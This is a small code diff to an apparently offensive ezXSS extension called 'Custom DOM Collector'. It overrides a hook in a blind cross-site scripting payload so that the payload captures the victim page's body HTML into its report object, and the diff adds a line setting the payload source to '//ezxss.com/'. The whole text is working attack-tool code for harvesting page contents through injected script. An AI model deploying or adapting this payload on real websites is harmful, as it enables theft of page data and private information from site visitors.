@@ -2,11 +2,12 @@
 // @name              Custom DOM Collector
 // @description       Collects only the body HTML instead of the full document
 // @author            ssl
-// @version           1.0
+// @version           1.1
 // </ezXSS extension>
 
 function ez_hL() {
     // Override the default ez_hL function
+    ez_rD.payload = "//ezxss.com/";
     try {
         ez_rD.dom = ez_n(document.body.outerHTML);
     } catch (e) {
